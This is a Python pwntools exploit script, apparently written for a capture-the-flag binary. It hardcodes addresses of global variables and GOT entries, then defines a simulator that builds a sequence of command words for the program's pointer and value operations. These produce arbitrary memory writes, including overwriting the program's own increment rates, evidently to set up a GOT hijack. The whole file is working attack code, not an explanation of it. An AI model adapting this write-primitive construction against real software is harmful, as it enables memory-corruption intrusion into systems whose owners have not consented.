from pwn import *

# ---- fixed addresses (from static analysis of the stripped binary) ----
AMOUNTS_ADDR = 0x404060   # int amounts[4] = {0x1000,0x100,0x10,0x1}
SWITCH_ADDR  = 0x4040b0   # uint8_t ptrval_switch
VAL_ADDR     = 0x4040b8   # uint64_t val
PTR_ADDR     = 0x4040c0   # uint64_t *ptr

GOT_CALLOC  = 0x404038
GOT_PRINTF  = 0x404028
GOT_SCANF   = 0x404048
GOT_SETVBUF = 0x404040
GOT_MEMCMP  = 0x404030
GOT_PUTS    = 0x404018
GOT_WRITE   = 0x404020

WORDS_INC = ["holymoly", "rolypoly", "monopoly", "guacamole"]       # amounts[0..3], ptr/val += amounts[i]
WORDS_DEC = ["robocarpoli", "halligalli", "broccoli", "bordercollie"]  # amounts[0..3], ptr/val -= amounts[i]
W_READ   = "blueberry"
W_WRITE  = "cranberry"
W_SWITCH = "mystery"

MASK64 = (1 << 64) - 1


class Sim:
    """Tracks the program's state while we build a command string, so we
    can greedily compute cheap move sequences using whatever the CURRENT
    amounts[] rates are (which we may have overwritten)."""

    def __init__(self):
        self.ptr = 0
        self.val = 0
        self.switch = 0  # 0 = SWITCH_VAL (affects val), 1 = SWITCH_PTR (affects ptr)
        self.amounts = [0x1000, 0x100, 0x10, 0x1]
        self.out = []  # list of word strings to send

    def _emit(self, w):
        self.out.append(w)

    def toggle_switch(self):
        self._emit(W_SWITCH)
        self.switch ^= 1

    def set_switch(self, want):
        if self.switch != want:
            self.toggle_switch()

    def inc(self, idx):
        self._emit(WORDS_INC[idx])
        amt = self.amounts[idx]
        if self.switch:
            self.ptr = (self.ptr + amt) & MASK64
        else:
            self.val = (self.val + amt) & MASK64

    def dec(self, idx):
        self._emit(WORDS_DEC[idx])
        amt = self.amounts[idx]
        if self.switch:
            self.ptr = (self.ptr - amt) & MASK64
        else:
            self.val = (self.val - amt) & MASK64

    def read(self):
        self._emit(W_READ)

    def write(self):
        self._emit(W_WRITE)
        # *ptr = val -- if ptr lands on amounts[], model that too (8 bytes = amounts[i],amounts[i+1])
        if AMOUNTS_ADDR <= self.ptr < AMOUNTS_ADDR + 16 and (self.ptr - AMOUNTS_ADDR) % 4 == 0:
            idx = (self.ptr - AMOUNTS_ADDR) // 4
            lo = self.val & 0xffffffff
            hi = (self.val >> 32) & 0xffffffff
            if idx <= 2:
                self.amounts[idx] = to_signed32(lo)
                if idx + 1 <= 3:
                    self.amounts[idx + 1] = to_signed32(hi)

    def move_cheap(self, target, use_switch_ptr):
        """Move val (or ptr, if use_switch_ptr) to `target` using greedy
        largest-rate-first increments, trying both +delta and -delta (mod 2^64)
        to see which is cheaper, using the CURRENT self.amounts rates."""
        self.set_switch(1 if use_switch_ptr else 0)
        cur = self.ptr if use_switch_ptr else self.val
        delta_fwd = (target - cur) & MASK64
        delta_bwd = (cur - target) & MASK64
        if count_ops(delta_fwd, self.amounts) <= count_ops(delta_bwd, self.amounts):
            self._apply_delta(delta_fwd, True, use_switch_ptr)
        else:
            self._apply_delta(delta_bwd, False, use_switch_ptr)

    def _apply_delta(self, delta, is_add, use_switch_ptr):
        rates = sorted(enumerate(self.amounts), key=lambda x: -x[1] if x[1] > 0 else 0)
        remaining = delta
        for idx, rate in rates:
            if rate <= 0:
                continue
            n = remaining // rate
            for _ in range(n):
                if is_add:
                    self.inc(idx)
                else:
                    self.dec(idx)
            remaining -= n * rate
        # remaining should be 0 if rates include 1-valued denom; otherwise leftover ignored

    def payload(self):
        s = "".join(self.out)
        return s


def to_signed32(x):
    x &= 0xffffffff
    if x >= 0x80000000:
        x -= 0x100000000
    return x


def count_ops(delta, amounts):
    remaining = delta
    total = 0
    for rate in sorted([a for a in amounts if a > 0], reverse=True):
        n = remaining // rate
        total += n
        remaining -= n * rate
    return total
